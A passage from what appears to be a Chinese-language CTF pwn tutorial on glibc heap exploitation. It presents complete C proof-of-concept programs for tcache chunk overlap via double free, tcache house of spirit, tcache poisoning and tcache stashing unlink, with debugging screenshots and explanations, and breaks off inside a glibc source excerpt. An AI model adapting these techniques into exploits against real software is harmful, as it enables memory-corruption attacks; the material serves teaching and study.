class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    <span class="built_in">assert</span>(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-20"><a href="#调试-20" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110448627.png"
                      alt="image-20231015110448627"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110515624.png"
                      alt="image-20231015110515624"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110726890.png"
                      alt="image-20231015110726890"
                ></p>
<p>首先申请<code>9</code>个 <code>non-fast_chunk</code> 和一个 <code>obstruct-chunk</code> ，将 <code>tcache</code>  填满，剩余两个放入 <code>unsorted_bin</code>，因为 <code>a</code> 与 <code>prev</code>相邻，所以会被整合在一起。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110930692.png"
                      alt="image-20231015110930692"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110909769.png"
                      alt="image-20231015110909769"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111410250.png"
                      alt="image-20231015111410250"
                ></p>
<p>从 <code>tcache</code> 头部取出一个 <code>chunk</code> ，然后再次 <code>free(a)</code>，此时 <code>chunk_a</code> 同时出现在了 <code>unsorted_bin</code> 和 <code>tcache</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111505547.png"
                      alt="image-20231015111505547"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111750815.png"
                      alt="image-20231015111750815"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111900959.png"
                      alt="image-20231015111900959"
                ></p>
<p>此时申请 <code>0x120</code> 大小的 <code>chunk</code> 将 <code>unsorted_bin</code> 中包含 <code>chunk_a_fd</code> 的 <code>chunk</code> 申请出来，我们就可以修改 <code>tcache</code> 中 <code>chunk_a</code> 的下一个链接进来的 <code>chunk</code> 为我们伪造的 <code>chunk</code>，在申请两次用户区为 <code>0x100</code> 大小的 <code>chunk</code> 就可以将我们伪造的 <code>chunk</code> 申请出来。</p>
<h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><h3 id="源码-21"><a href="#源码-21" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="调试-21"><a href="#调试-21" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015121919702.png"
                      alt="image-20231015121919702"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015121949906.png"
                      alt="image-20231015121949906"
                ></p>
<p>这种利用能够方法很简单，只需要将 <code>fake_chunks_size=0x40</code>，然后 <code>free(fake_chunk)</code> 即可将其放入到 <code>tcache</code> 中，再去申请 <code>0x30</code> 大小的 <code>chunk</code> 即可将其申请出来。</p>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><h3 id="源码-22"><a href="#源码-22" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-22"><a href="#调试-22" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015125946150.png"
                      alt="image-20231015125946150"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130236228.png"
                      alt="image-20231015130236228"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130341804.png"
                      alt="image-20231015130341804"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130255142.png"
                      alt="image-20231015130255142"
                ></p>
<p>申请同样大小的 <code>a,b</code> 两个 <code>chunk</code>，并将其放在 <code>tcache</code> 中。然后将后进入的 <code>chunk_b_fd</code> 改为 <code>stack_var_fd</code>，这样就能将其链接进 <code>tcache</code>，<code>tcache</code> 的数量为 <code>2</code>，可以申请两个 <code>chunk</code> 出来。 在 <code>2.29</code> 以后，如果 <code>tcache</code> 的数量为 <code>0</code>，就算 <code>tcache</code> 中有 <code>free_chunk</code> 也不会将其取出来，所以我们确保 <code>tcache</code> 的数量为 <code>2</code>，这样就能取出两个 <code>chunk</code>。</p>
<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h2><p>利用 <code>calloc</code> 可以越过 <code>tcache</code> 取 <code>chunk</code> 的特点结合 <code>house of lore</code> 进行的攻击手段，可以向任意地址写入任意值，也可以申请任意地址。</p>
<h3 id="源码-23"><a href="#源码-23" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span>(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE <span class="comment">//如果程序启用了Tcache</span></span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">        stash them in the tcache.  */</span></span><br><span class="line">        <span class="comment">//遍历整个smallbin，获取相同size的free chunk</span></span><br><span class="line">        <span class="type">size_t</span> tc_idx = <span class="built_in">csize2tidx</span> (nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="comment">//判定Tcache的size链表是否已满，并且取出smallbin的末尾Chunk。</span></span><br><span class="line">            <span class="comment">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span></span><br><span 